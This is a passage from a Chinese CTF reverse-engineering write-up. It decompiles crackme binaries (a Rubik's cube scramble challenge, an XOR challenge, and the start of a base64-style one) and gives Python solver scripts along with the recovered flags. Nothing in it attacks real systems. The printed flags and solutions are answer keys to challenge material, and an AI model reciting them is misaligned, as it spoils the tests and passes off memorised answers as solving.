class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">~$ .&#x2F;cube3</span><br><span class="line">                           三阶魔方</span><br><span class="line">        _______________________________________________</span><br><span class="line">        |                                             |</span><br><span class="line">        |        请输入编号:                           |</span><br><span class="line">        |       1.打乱1     2.打乱2                    |</span><br><span class="line">        |       3.打乱3     4.打乱4                    |</span><br><span class="line">        |       5.退出程序                             |</span><br><span class="line">        |                                             |</span><br><span class="line">        |                                             |</span><br><span class="line">        -----------------------------------------------</span><br><span class="line">                    请输入编号[1&#x2F;2]:4</span><br><span class="line">                            ________________</span><br><span class="line">                            |  2 |  3 |  3 |</span><br><span class="line">                            +----+----+----+</span><br><span class="line">                            |  2 |  4 |  4 |</span><br><span class="line">                            +----+----+----+</span><br><span class="line">                            |  5 |  3 |  6 |</span><br><span class="line">                            +----+----+----+</span><br><span class="line">                           &#x2F;  4 &#x2F; 5  &#x2F; 1  &#x2F;|</span><br><span class="line">                          &#x2F;____&#x2F;____&#x2F;____&#x2F; |</span><br><span class="line">                         &#x2F;  1 &#x2F;  1 &#x2F;  6 &#x2F;|3+</span><br><span class="line">                        &#x2F;____&#x2F;____&#x2F;____&#x2F; |&#x2F;|</span><br><span class="line">                       &#x2F;  3 &#x2F;  5 &#x2F;  1 &#x2F;|1|1|</span><br><span class="line">        ______________&#x2F;____&#x2F;____&#x2F;____&#x2F;4|&#x2F;|&#x2F;|</span><br><span class="line">        | 1 |  5 |  5 |  2 |  4 |  6 |&#x2F;|6+1|</span><br><span class="line">        +---+----+----+----+----+----+6|&#x2F;|&#x2F;</span><br><span class="line">        | 5 |  5 |  2 |  6 |  3 |  3 |&#x2F;|6+</span><br><span class="line">        +---+----+----+----+----+----+2|&#x2F;</span><br><span class="line">        | 6 |  2 |  3 |  6 |  3 |  5 |&#x2F;</span><br><span class="line">        +---+----+----+----+----+----+</span><br><span class="line">                      |  2 |  1 |  4 |</span><br><span class="line">                      +----+----+----+</span><br><span class="line">                      |  4 |  2 |  4 |</span><br><span class="line">                      +----+----+----+</span><br><span class="line">                      |  4 |  2 |  5 |</span><br><span class="line">                      +----+----+----+</span><br><span class="line">Enter a formula and separate each step with a space</span><br><span class="line">Tip: The format of the operation is like R2 R2&#39; R</span><br><span class="line">[&#39;] represents a counterclockwise rotation</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>需要输入魔方的公式<br><a href="https://zhuanlan.zhihu.com/p/396215313">【初级篇】三阶魔方入门教程 - 知乎 (zhihu.com)</a></p><p>要还原魔方，最简单的方法是反着拧<br>要反着拧，就要找到打乱的顺序</p><p>ida大部分函数看不懂没关系，可以凭感觉找到存储打乱顺序的变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">formula_get_by_id</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-294h]</span></span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">162</span>]; <span class="comment">// [rsp+20h] [rbp-290h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+2A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x280</span>uLL);</span><br><span class="line">  v4[<span class="number">0</span>] = <span class="number">23</span>;</span><br><span class="line">  v4[<span class="number">1</span>] = <span class="number">3</span>;</span><br><span class="line">  v4[<span class="number">2</span>] = <span class="number">4</span>;</span><br><span class="line">  v4[<span class="number">3</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">4</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">5</span>] = <span class="number">9</span>;</span><br><span class="line">  v4[<span class="number">6</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">7</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">8</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">9</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">10</span>] = <span class="number">20</span>;</span><br><span class="line">  v4[<span class="number">11</span>] = <span class="number">11</span>;</span><br><span class="line">  v4[<span class="number">12</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">13</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">14</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">15</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">16</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">17</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">18</span>] = <span class="number">4</span>;</span><br><span class="line">  v4[<span class="number">19</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">20</span>] = <span class="number">24</span>;</span><br><span class="line">  v4[<span class="number">40</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">41</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">42</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">43</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">44</span>] = <span class="number">1</span>;</span><br><span class="line">  v4[<span class="number">45</span>] = <span class="number">4</span>;</span><br><span class="line">  v4[<span class="number">46</span>] = <span class="number">2</span>;</span><br><span class="line">  v4[<span class="number">47</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">48</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">49</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">50</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">51</span>] = <span class="number">10</span>;</span><br><span class="line">  v4[<span class="number">52</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">53</span>] = <span class="number">21</span>;</span><br><span class="line">  v4[<span class="number">54</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">55</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">56</span>] = <span class="number">17</span>;</span><br><span class="line">  v4[<span class="number">57</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">58</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">59</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">60</span>] = <span class="number">24</span>;</span><br><span class="line">  v4[<span class="number">80</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">81</span>] = <span class="number">15</span>;</span><br><span class="line">  v4[<span class="number">82</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">83</span>] = <span class="number">2</span>;</span><br><span class="line">  v4[<span class="number">84</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">85</span>] = <span class="number">17</span>;</span><br><span class="line">  v4[<span class="number">86</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">87</span>] = <span class="number">9</span>;</span><br><span class="line">  v4[<span class="number">88</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">89</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">90</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">91</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">92</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">93</span>] = <span class="number">3</span>;</span><br><span class="line">  v4[<span class="number">94</span>] = <span class="number">11</span>;</span><br><span class="line">  v4[<span class="number">95</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">96</span>] = <span class="number">5</span>;</span><br><span class="line">  v4[<span class="number">97</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">98</span>] = <span class="number">6</span>;</span><br><span class="line">  v4[<span class="number">99</span>] = <span class="number">22</span>;</span><br><span class="line">  v4[<span class="number">100</span>] = <span class="number">24</span>;</span><br><span class="line">  v4[<span class="number">120</span>] = <span class="number">20</span>;</span><br><span class="line">  v4[<span class="number">121</span>] = <span class="number">12</span>;</span><br><span class="line">  v4[<span class="number">122</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">123</span>] = <span class="number">21</span>;</span><br><span class="line">  v4[<span class="number">124</span>] = <span class="number">14</span>;</span><br><span class="line">  v4[<span class="number">125</span>] = <span class="number">23</span>;</span><br><span class="line">  v4[<span class="number">126</span>] = <span class="number">19</span>;</span><br><span class="line">  v4[<span class="number">127</span>] = <span class="number">13</span>;</span><br><span class="line">  v4[<span class="number">128</span>] = <span class="number">3</span>;</span><br><span class="line">  v4[<span class="number">129</span>] = <span class="number">18</span>;</span><br><span class="line">  v4[<span class="number">130</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">131</span>] = <span class="number">3</span>;</span><br><span class="line">  v4[<span class="number">132</span>] = <span class="number">0x16</span>;</span><br><span class="line">  v4[<span class="number">134</span>] = <span class="number">8</span>;</span><br><span class="line">  v4[<span class="number">135</span>] = <span class="number">1</span>;</span><br><span class="line">  v4[<span class="number">136</span>] = <span class="number">0x12</span>;</span><br><span class="line">  v4[<span class="number">137</span>] = <span class="number">7</span>;</span><br><span class="line">  v4[<span class="number">138</span>] = <span class="number">0x12</span>;</span><br><span class="line">  v4[<span class="number">139</span>] = <span class="number">0xB</span>;</span><br><span class="line">  v4[<span class="number">140</span>] = <span class="number">0x18</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v4[<span class="number">40</span> * a2 - <span class="number">40</span> + i] != <span class="number">24</span>; ++i )</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">4L</span>L * i) = v4[<span class="number">40</span> * a2 - <span class="number">40</span> + i];</span><br><span class="line">  *(_DWORD *)(<span class="number">4L</span>L * i + a1) = <span class="number">24</span>;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为题目说一共有24种操作，刚好是v4元素的取值范围-1<br>减一的原因是因为有四个魔方，最大的元素（24）的作用类似分隔符，通过主函数的while语句也可以判断出来，而且整个v4数组刚好被值为24的元素分隔成4部分，刚好对应4个魔方</p><p>因此可以将这些元素提取出来（有坑），然后映射到对应的公式，再反着输出就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">s = <span class="built_in">open</span>(<span class="string">&#x27;./tmp.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).readlines()</span><br><span class="line"></span><br><span class="line">print(<span class="built_in">len</span>(s))</span><br><span class="line"></span><br><span class="line">ss = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    num = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(i)):</span><br><span class="line">        <span class="keyword">if</span> i[j] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            num = i[j+<span class="number">1</span>:<span class="number">-2</span>]</span><br><span class="line">    ss.append(<span class="built_in">int</span>(num))</span><br><span class="line"></span><br><span class="line">rotate = [</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;U\&#x27;&#x27;</span>, <span class="string">&#x27;U2&#x27;</span>, <span class="string">&#x27;U2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;D\&#x27;&#x27;</span>, <span class="string">&#x27;D2&#x27;</span>, <span class="string">&#x27;D2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;F\&#x27;&#x27;</span>, <span class="string">&#x27;F2&#x27;</span>, <span class="string">&#x27;F2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;B\&#x27;&#x27;</span>, <span class="string">&#x27;B2&#x27;</span>, <span class="string">&#x27;B2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;L\&#x27;&#x27;</span>, <span class="string">&#x27;L2&#x27;</span>, <span class="string">&#x27;L2\&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;R\&#x27;&#x27;</span>, <span class="string">&#x27;R2&#x27;</span>, <span class="string">&#x27;R2\&#x27;&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ss:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">24</span>:</span><br><span class="line">        print()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(rotate[i], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ss)<span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    <span class="keyword">if</span> ss[i] == <span class="number">24</span>:</span><br><span class="line">        print()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> rotate[ss[i]]:</span><br><span class="line">            print(rotate[ss[i]<span class="number">-1</span>], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(rotate[ss[i]+<span class="number">1</span>], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">print()</span><br><span class="line">sss = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">B2&#x27; D&#x27; L2&#x27; F&#x27; D2&#x27; B2&#x27; R2&#x27; B F2 R&#x27; D2 B L2&#x27; B&#x27; F L2&#x27; F&#x27; D&#x27; U2 R2</span></span><br><span class="line"><span class="string">B&#x27; D2 F&#x27; L D2 L2 R L2 F2&#x27; D2&#x27; L2 R2&#x27; F&#x27; U2&#x27; D&#x27; U B D2 R2&#x27; D2&#x27;</span></span><br><span class="line"><span class="string">R2&#x27; D2&#x27; L2&#x27; D B2&#x27; F2 U2 B&#x27; D L2&#x27; B&#x27; D2 F B&#x27; L D U2&#x27; L2 B2 D</span></span><br><span class="line"><span class="string">F2 L2&#x27; D2 L2&#x27; U F&#x27; U&#x27; R2&#x27; U2 D2 L2&#x27; U2 B L2 R2 B2&#x27; R D2 B&#x27; R&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ssss = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sss:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&#x27; &#x27;</span> <span class="keyword">and</span> i != <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">        ssss += i</span><br><span class="line"></span><br><span class="line">print(ssss)</span><br></pre></td></tr></table></figure><p>这样就可以得到四个魔方的解法，可以使用程序验证，最后再将解法按照题目要求处理就行</p><p><code>xsctf&#123;0a15a3168e6bf08df8178186312b0396&#125;</code></p><p>坑</p><ul><li>v4数组的定义种少了一个元素<code>v4[133]</code>，需要动态调试得到这个元素的值</li><li>因为是4个魔方一起反着输出，所以第一个魔方的解法应该对应第四行的输出</li><li>最后串起来的时候是<code>第一个魔方的解法+第二个魔方的解法...</code>，即第四行+第三行+…</li></ul><h2 id="easy-xor"><a href="#easy-xor" class="headerlink" title="easy_xor"></a>easy_xor</h2><p>核心代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+33h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+33h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v7 = key[v9 % <span class="number">4</span>] ^ v8;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v7--;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = v11++;</span><br><span class="line">      s[v3] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = v11++;</span><br><span class="line">    s[v5] = <span class="number">0</span>;</span><br><span class="line">    ++v9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v11 &lt;= <span class="number">2559</span> )</span><br><span class="line">    s[v11++] = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2559</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( r[i] != s[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Lose lose lose!&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">2560</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Win win win!&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中数组r是在运行时生成的，因此需要使用动态调试</p><p>大概的逻辑是：</p><ul><li>接收输入直到回车符</li><li>计算每个字符异或的结果</li><li>异或的结果是多少，就在数组中添加多少个1，然后添加一个0</li><li>对比两个数组的差异</li></ul><p>因此解密的逻辑就是</p><ol><li>拿到目标数组</li><li>遍历数组中1的个数，直到遇到数字0</li><li>将以上1的个数循环异或key的元素</li><li>转换为字符输出</li><li>重复2到4，直到遇到-1</li></ol><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s = [...]</span><br><span class="line">ch = []</span><br><span class="line">key_index = <span class="number">0</span></span><br><span class="line">key = <span class="string">&#x27;SCNU&#x27;</span></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">        c += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># print(hex(c), end=&#x27;&#x27;)</span></span><br><span class="line">        ch.append(<span class="built_in">chr</span>(c^<span class="built_in">ord</span>(key[key_index%<span class="number">4</span>])))</span><br><span class="line">        key_index += <span class="number">1</span></span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(ch))</span><br></pre></td></tr></table></figure><p><code>flag&#123;Winn3r_n0t_L0s3r_#&#125;</code></p><h2 id="eazy-64x"><a href="#eazy-64x" class="headerlink" title="eazy_64x"></a>eazy_64x</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+8h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+14h] [rbp-8Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// [rsp+20h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">4</span>]; <span class="comment">// [rsp+2Ch] [rbp-74h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">104</span>]; <span class="comment">// [rsp+30h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x64</span>uLL);</span><br><span class="line">  __isoc99_scanf(&amp;unk_222C, s);</span><br><span class="line">  v7 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v7 == <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v7 / <span class="number">3</span> &gt;= v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, &amp;s[v5], <span class="number">3u</span>LL);</span><br><span class="line">      v9 = encrypt(dest);</span><br><span class="line">      v8 = <span class="built_in">strlen</span>(v9);</span><br><span class="line">      get_trans(v9);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v9[i] != glob[<span class="number">4</span> * v4 + i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span 